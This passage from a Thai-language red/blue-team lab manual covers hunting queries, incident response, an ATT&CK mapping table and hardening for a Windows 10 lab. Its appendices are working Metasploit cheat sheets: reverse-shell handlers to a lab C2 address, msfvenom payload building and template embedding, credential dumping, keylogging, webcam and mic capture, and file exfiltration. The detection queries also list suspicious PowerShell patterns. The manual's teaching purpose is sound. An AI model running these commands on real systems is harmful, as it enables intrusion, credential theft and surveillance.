## 17.4 Hunting Queries (PowerShell — รันบน Windows 10 Lab)

**H1 — Discovery burst (LOLBins หลายตัวจาก parent เดียวในเวลาสั้น)**
```powershell
$events = Get-WinEvent -FilterHashtable @{LogName='Security'; Id=4688} -MaxEvents 1000
$events | Where-Object {
  $_.Message -match 'whoami\.exe|net1?\.exe|systeminfo\.exe|tasklist\.exe|ipconfig\.exe|nltest\.exe'
} | Sort-Object TimeCreated | Format-Table TimeCreated, @{n='Line';e={($_.Message -split "`n" | Select-String 'New Process Name').ToString().Trim()}}
```

**H2 — PowerShell script block ที่มี pattern น่าสงสัย (4104)**
```powershell
Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' -MaxEvents 500 |
  Where-Object { $_.Id -eq 4104 -and $_.Message -match 'FromBase64String|IEX|Invoke-Expression|DownloadString|-enc ' } |
  Format-List TimeCreated, Message
```

**H3 — Network connection ไป host ภายในที่ไม่ใช่ server บนพอร์ตแปลก (Sysmon 3)**
```powershell
Get-WinEvent -LogName 'Microsoft-Windows-Sysmon/Operational' -MaxEvents 1000 |
  Where-Object { $_.Id -eq 3 -and $_.Message -match 'DestinationPort: (4444|4445|8443)' } |
  Format-List TimeCreated, Message
```

## 17.5 การ Tune และ False Positives
- **R1 (พอร์ต 4444):** FP ต่ำในองค์กรทั่วไป แต่บาง dev tool ใช้ — ตรวจ `Image` ประกอบ
- **R3 (LSASS):** ต้อง allowlist AV/EDR ที่เข้าถึง LSASS โดยชอบธรรม (เช่น MsMpEng.exe)
- **R4 (UAC):** FP ต่ำมาก — auto-elevate binaries ไม่ค่อย spawn shell ในการใช้งานปกติ

## 17.6 MITRE ATT&CK Mapping (บทที่ 17)
รวมทุก technique จากบท 4–15 — ดูตารางรวมในบทที่ 19

## 17.7 Lessons Learned (บทที่ 17)
- Detection ที่ดี = behavior + context + baseline ไม่ใช่ hash อย่างเดียว (ผู้โจมตีเปลี่ยน hash ง่าย แต่เปลี่ยนพฤติกรรมยาก)
- Rule ที่ FP ต่ำสุด/คุ้มสุดในชุดนี้: **LSASS access, UAC-bypass parent/child, log-cleared, persistence-from-user-path**

# บทที่ 18 — Incident Response (Triage → Containment → Eradication → Recovery)

## 18.1 Objective
เปลี่ยนสัญญาณ detection เป็นการตอบสนองที่มีลำดับชัดเจน สำหรับเหตุการณ์ Meterpreter บน WIN10-LAB

## 18.2 กรอบ IR (อิง NIST SP 800-61 — Preparation → Detection & Analysis → Containment/Eradication/Recovery → Post-Incident)

### 18.2.1 Preparation
- เปิด Telemetry (บทที่ 1, 16) + forward log (บทที่ 16.4)
- มี Snapshot baseline + backup แยก
- มี playbook + รายชื่อผู้รับผิดชอบ (ใน Lab = ตัวคุณเอง)

### 18.2.2 Detection & Analysis (Triage)
ลำดับ Triage เมื่อได้ alert:
1. **ยืนยันของจริงไหม** — ตรวจ Event ต้นทาง (4688/Sysmon 1/3/8/10) ว่าตรง IoC หรือไม่
2. **ขอบเขต** — process chain, session C2, สิทธิ์ที่ได้, persistence ที่วางไว้
3. **Timeline** — เรียงเวลา: initial access → migrate → priv-esc → cred access → persistence → collection
4. **จัดระดับความรุนแรง** — ตามข้อมูล/สิทธิ์ที่กระทบ

**คำสั่งเก็บหลักฐานเบื้องต้น (Windows 10 Lab):**
```powershell
# process + parent + path
Get-CimInstance Win32_Process | Select-Object ProcessId, ParentProcessId, Name, CommandLine |
  Format-Table -AutoSize

# network connections ปัจจุบัน + process
Get-NetTCPConnection -State Established |
  Select-Object LocalAddress,LocalPort,RemoteAddress,RemotePort,OwningProcess

# autoruns (persistence) — Run keys, services, tasks
Get-ItemProperty 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -EA SilentlyContinue
Get-ItemProperty 'HKLM:\Software\Microsoft\Windows\CurrentVersion\Run' -EA SilentlyContinue
Get-ScheduledTask | Where-Object { $_.TaskPath -notmatch '\\Microsoft\\' }
Get-CimInstance Win32_Service | Where-Object { $_.PathName -match 'Users|Temp|AppData|Public' } |
  Select-Object Name, State, StartMode, PathName
```

### 18.2.3 Containment
- **แยกเครือข่าย** ทันที: ปิด/ถอด network adapter ของ VM หรือบล็อก C2 ที่ host firewall
```powershell
New-NetFirewallRule -DisplayName "IR-Block-C2" -Direction Outbound -RemoteAddress 192.168.56.10 -Action Block
```
- อย่ารีบ reboot ถ้ายังต้องเก็บ volatile evidence (หน่วยความจำ/session)

### 18.2.4 Eradication
- Kill **ทั้ง process chain** (รวม process ที่ถูก migrate เข้า — เช่น explorer.exe ที่มี thread แปลก อาจต้องจัดการเฉพาะ thread/รีสตาร์ท process อย่างระวัง)
- ลบ **ทุกกลไก persistence** (service/task/Run key — บทที่ 9.8)
- ลบไฟล์ payload + artifact; ตรวจ hash เทียบ IoC
- รีเซ็ต credential ที่อาจรั่ว (บทที่ 12.8)

### 18.2.5 Recovery
- คืนค่าเครื่องจาก **Snapshot baseline** (วิธีที่สะอาดสุดใน Lab) หรือ rebuild
- เปิดการป้องกันครบ (Defender real-time, firewall, ASR)
- เฝ้าสังเกต (monitoring) หลังคืนค่าเพื่อยืนยันไม่มี re-infection

### 18.2.6 Post-Incident (Lessons Learned)
- บันทึก timeline + detection gap ที่พบ
- ปรับ rule (บทที่ 17) และ hardening (บทที่ 20)

## 18.3 แผนภาพความสัมพันธ์ (Attack → Telemetry → Detection → Response)
```
User Execution (T1204.002)  ──► 4688 / Sysmon 1,11 / Defender 1116  ──► R (user-folder exe + net)  ──► Isolate + kill
Process Injection (T1055)   ──► Sysmon 8/10                          ──► R2                          ──► kill chain
Priv-Esc UAC (T1548.002)    ──► 4688 (fodhelper→shell) / Sysmon 13   ──► R4                          ──► ล้าง registry hijack
Cred Dump (T1003.001)       ──► Sysmon 10 (lsass)                    ──► R3                          ──► reset creds
Persistence (T1053/T1543)   ──► 4698 / 7045 / Sysmon 13             ──► R6                          ──► ลบทุกกลไก
Defense Evasion (T1070.001) ──► 1102 / 104                           ──► R5                          ──► สืบจาก log ที่ forward
Exfiltration (T1041)        ──► Sysmon 3 (spike) / 4663              ──► egress rule                 ──► Isolate
```

## 18.4 MITRE ATT&CK Mapping (บทที่ 18)
ครอบคลุมทุก tactic — mapping รวมในบทที่ 19

## 18.5 Lessons Learned (บทที่ 18)
- **อย่าประกาศ "สะอาด" จนกว่าจะไล่ persistence ครบ** — Meterpreter มักวางหลายชั้น
- ใน Lab การ **Revert Snapshot** คือ recovery ที่เชื่อถือได้สุด แต่ต้องเก็บหลักฐาน/บทเรียนก่อน revert

---

# บทที่ 19 — ตาราง MITRE ATT&CK Mapping รวม

> ยืนยันรหัสทุกตัวกับ attack.mitre.org ก่อนใช้งานจริง — ตารางนี้สรุปจากบทที่ 4–15

| บท | กิจกรรม (Red) | Tactic | Technique ID | Blue Team Signal หลัก |
|----|---------------|--------|--------------|------------------------|
| 4 | สร้าง/obfuscate payload | Defense Evasion | T1027 | hash, MOTW, Defender 1116 |
| 4 | ฝังใน template | Defense Evasion | T1036 | parent/child, signature |
| 5 | C2 reverse_tcp | Command and Control | T1571 | Sysmon 3 (port 4444) |
| 5 | C2 reverse_https | Command and Control | T1573.002 | TLS self-signed, Sysmon 3 |
| 6 | ผู้ใช้รัน .exe | Execution | T1204.002 | 4688, Sysmon 1/11 |
| 6 | โอนไฟล์เข้าเครื่อง | Command and Control | T1105 | Sysmon 11, MOTW |
| 7 | migrate (injection) | Defense Evasion / Priv-Esc | T1055 | Sysmon 8/10 |
| 7 | shell → cmd | Execution | T1059.003 | 4688 parent/child |
| 7 | clearev | Defense Evasion | T1070.001 | Security 1102, System 104 |
| 8 | keylogging | Collection | T1056.001 | injection + behavior |
| 8 | screen capture | Collection | T1113 | behavior / EDR |
| 8 | video capture | Collection | T1125 | camera consent store |
| 8 | audio capture | Collection | T1123 | mic consent store |
| 9 | Run key | Persistence | T1547.001 | Sysmon 13, 4657 |
| 9 | scheduled task | Persistence | T1053.005 | Security 4698 |
| 9 | service | Persistence | T1543.003 | System 7045, 4697 |
| 10 | getsystem | Priv-Esc | T1134 | Security 4672, pipe 17/18 |
| 10 | bypass UAC | Priv-Esc / Def-Evasion | T1548.002 | 4688 (fodhelper→shell), Sysmon 13 |
| 10 | local exploit | Priv-Esc | T1068 | crash/patch telemetry |
| 11 | system/user/process discovery | Discovery | T1082/T1033/T1057 | 4688 LOLBins burst |
| 11 | security software discovery | Discovery | T1518.001 | 4688 |
| 12 | LSASS dump (kiwi) | Credential Access | T1003.001 | **Sysmon 10 (lsass)** |
| 12 | SAM dump (hashdump) | Credential Access | T1003.002 | SAM hive access |
| 13 | psexec (concept) | Lateral Movement | T1021.002 | 4624 Type3, 7045 |
| 13 | pass-the-hash (concept) | Lateral Movement | T1550.002 | 4624 Type3 |
| 14 | data from local system | Collection | T1005 | 4663 (SACL) |
| 14 | exfil over C2 | Exfiltration | T1041 | Sysmon 3 spike |
| 15 | data encrypted for impact | Impact | T1486 | file-write velocity (Sysmon 11) |
| 15 | inhibit system recovery | Impact | T1490 | vssadmin/wmic (4688) |
| 15 | service stop | Impact | T1489 | System 7036/7040 |
| 15 | impair defenses | Defense Evasion | T1562.001 | Defender 5001/5007 |

---

# บทที่ 20 — บทเรียนที่ได้และการเสริมความแข็งแกร่ง (Lessons Learned & Hardening)

## 20.1 สรุปบทเรียนหลัก (Red → Blue)
1. **payload มาตรฐานของ msfvenom เสียงดัง** ต่อ Defender/telemetry — เหมาะเป็นกรณีศึกษาการตรวจจับ ไม่ใช่การหลบเลี่ยง
2. **จุดตรวจจับที่คุ้มค่าที่สุด**: Sysmon 8/10 (injection/LSASS), Security 4688 + command line, 4698/7045 (persistence), 1102/104 (log clearing)
3. **initial access คือคอขวด** — ตัดที่ผู้ใช้เปิดไฟล์ ได้ผลมากกว่าตามล่าปลายทาง
4. **สิทธิ์ผู้ใช้ = Standard** ตัด bypassuac ทั้งตระกูล
5. **forward log ออกนอกเครื่อง** ป้องกันการสูญหลักฐานเมื่อ clearev

## 20.2 Hardening Checklist (Windows 10 Lab → นำไปปรับใช้จริง)

**Identity & Privilege**
- [ ] ผู้ใช้ทั่วไปเป็น Standard User (ไม่อยู่ในกลุ่ม Administrators)
- [ ] ใช้ LAPS สำหรับรหัส local admin (ต่างกันทุกเครื่อง)
- [ ] เปิด Credential Guard และ LSASS Protection (RunAsPPL)

**Execution Control**
- [ ] เปิด SmartScreen + Attack Surface Reduction (ASR) rules
- [ ] ใช้ AppLocker/WDAC จำกัดการรัน exe จากโฟลเดอร์ผู้ใช้
- [ ] เปิด ASR rule "Block credential stealing from lsass.exe"

**Detection Readiness**
- [ ] เปิด Process Creation Auditing (4688) + command line
- [ ] เปิด PowerShell Script Block Logging (4104)
- [ ] ติดตั้ง Sysmon ด้วย config ที่ครอบคลุม (1,3,7,8,10,11,12-14,17,18,22)
- [ ] ตั้ง SACL (4663/4657) บนโฟลเดอร์/registry สำคัญ
- [ ] Forward log ไป SIEM แบบ real-time

**Network**
- [ ] Segmentation: ห้าม workstation คุย SMB กันเอง
- [ ] เปิด SMB signing
- [ ] Egress monitoring: alert outbound ผิดปกติ/พอร์ตแปลก

**Resilience**
- [ ] Backup 3-2-1 + สำเนา offline/immutable
- [ ] เปิด Controlled Folder Access
- [ ] จำกัดสิทธิ์ vssadmin/wmic + เฝ้า audit

## 20.3 Detection Coverage Matrix (สรุปว่าครอบคลุมแค่ไหน)
| Tactic | ครอบคลุมด้วย | ระดับความมั่นใจ |
|--------|--------------|------------------|
| Initial Access / Execution | 4688, Sysmon 1/11, Defender | สูง |
| C2 | Sysmon 3, egress | ปานกลาง–สูง |
| Defense Evasion (injection) | Sysmon 8/10 | สูง |
| Priv-Esc | 4672, 4688, Sysmon 13 | ปานกลาง–สูง |
| Credential Access | Sysmon 10 (lsass) | สูง (ถ้ามี Sysmon) |
| Persistence | 4698, 7045, Sysmon 13 | สูง |
| Collection/Exfil | 4663, Sysmon 3 | ปานกลาง |
| Impact (ransomware-like) | Sysmon 11 velocity, 4688 vssadmin | ปานกลาง |

## 20.4 Lessons Learned (ปิดเอกสาร)
- Red Team ทุก action ทิ้ง telemetry เสมอ — งานของ Blue Team คือ "เปิดตาให้ถูกที่" ก่อนเกิดเหตุ
- คู่มือนี้แสดงความสัมพันธ์ **Red Team Action → Windows Telemetry → Blue Team Detection → Investigation → Response** ครบวงจร เพื่อพัฒนาทั้งความสามารถเชิงรุกและเชิงรับใน Lab ที่ได้รับอนุญาต

---

# ภาคผนวก (Appendix)

## A. Meterpreter / msfconsole Cheat Sheet (คำสั่งที่ใช้ได้จริง)
```
# --- Handler ---
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.56.10 ; set LPORT 4444 ; set ExitOnSession false ; exploit -j

# --- Session mgmt ---
sessions ; sessions -i 1 ; background ; jobs ; jobs -K

# --- Orientation ---
sysinfo ; getuid ; getpid ; getprivs ; ps ; ipconfig ; route ; idletime

# --- Stealth / persistence-support ---
migrate -N explorer.exe

# --- Priv-esc ---
getsystem ; getuid
use post/multi/recon/local_exploit_suggester ; set SESSION 1 ; run
use exploit/windows/local/bypassuac_fodhelper ; set SESSION 1 ; run

# --- Credential access (สิทธิ์สูง) ---
hashdump
load kiwi ; creds_all ; lsa_dump_sam

# --- Surveillance (Collection) ---
keyscan_start ; keyscan_dump ; keyscan_stop
screenshot ; screenshare
webcam_list ; webcam_snap
record_mic -d 10

# --- Files / exfil ---
search -f *.docx ; download C:\\path\\file /home/kali/lab/loot/ ; upload local remote

# --- Discovery via shell ---
shell
  whoami /priv & whoami /groups & net user & net localgroup administrators
  systeminfo & tasklist /v & netstat -ano
```

## B. msfvenom Cheat Sheet (Windows only)
```
# ตรวจตัวเลือกก่อนใช้
msfvenom -l payloads --platform windows | grep meterpreter
msfvenom --list formats
msfvenom -l encoders

# exe พื้นฐาน x64
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.10 LPORT=4444 -f exe -o out.exe

# reverse_https
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.56.10 LPORT=8443 -f exe -o out_https.exe

# exe-service (persistence testing)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.10 LPORT=4444 -f exe-service -o svc.exe

# ฝังใน template
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.56.10 LPORT=4444 -x template.exe -k -f exe -o bundled.exe

# บันทึก hash เป็น IoC เสมอ
sha256sum out.exe
```

## C. Fake IP / Lab Plan (สรุป)
| บทบาท | IP (สมมติ) | พอร์ตที่ใช้ในตัวอย่าง |
|-------|-----------|----------------------|
| Kali (C2) | 192.168.56.10 | 4444 (tcp), 8443 (https), 8000 (http serve) |
| Windows 10 Target | 192.168.56.20 | — |
| SIEM (option) | 192.168.56.30 | — |

## D. Blue Team Quick Query Index (PowerShell)
```
# Process creation ล่าสุด
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4688} -MaxEvents 100

# Sysmon process/network/injection/lsass
Get-WinEvent -LogName 'Microsoft-Windows-Sysmon/Operational' -MaxEvents 200

# Persistence: service/task
Get-WinEvent -FilterHashtable @{LogName='System';Id=7045} -MaxEvents 50
Get-WinEvent -FilterHashtable @{LogName='Security';Id=4698} -MaxEvents 50

# Log cleared
Get-WinEvent -FilterHashtable @{LogName='Security';Id=1102} -MaxEvents 20

# Defender detections
Get-WinEvent -LogName 'Microsoft-Windows-Windows Defender/Operational' -MaxEvents 50 |
  Where-Object { $_.Id -in 1116,1117,5001,5007 }
```

## E. การตรวจสอบเวอร์ชันเครื่องมือ (ทำก่อนใช้จริงเสมอ)
```bash
msfconsole --version          # เวอร์ชัน Metasploit Framework
msfvenom --version
```
```powershell
# บน Windows 10 Lab
[System.Environment]::OSVersion
Get-MpComputerStatus | Select-Object AMEngineVersion, AMProductVersion
```
> **หลักการปิดท้าย:** หากพบว่า Event ID / ชื่อโมดูล / พฤติกรรมใดต่างจากคู่มือ ให้ยึด **ผลลัพธ์จริงจากเครื่องของคุณ + เอกสารทางการ** เป็นหลัก และระบุว่า "ไม่สามารถยืนยันได้" เมื่อไม่แน่ใจ — อย่าสมมติข้อมูลขึ้นเอง

---

## แหล่งอ้างอิงเชิงระเบียบวิธี (References)
- **MITRE ATT&CK** — attack.mitre.org (ยืนยัน Tactic/Technique ID ทุกครั้ง)
- **SnailSploit/Claude-Red** — โครง kill-chain และการจัดหมวด offensive skills แบบ operator-centric (github.com/SnailSploit/Claude-Red)
- **Skill `blackhat-go`** — กรอบ ATT&CK tactics/techniques mapping (Reconnaissance/Collection/Lateral Movement/…)
- **Microsoft Docs** — Windows Security Auditing, Event IDs, Windows Defender
- **Sysmon (Sysinternals)** — Event ID reference

> เอกสารนี้เป็นสื่อการเรียนรู้สำหรับ Authorized Security Testing Lab เท่านั้น — Windows 10 = เครื่องทดสอบที่ได้รับอนุญาต และทุกกิจกรรมเป็นการจำลองเพื่อพัฒนา Red Team และ Blue Team ควบคู่กัน
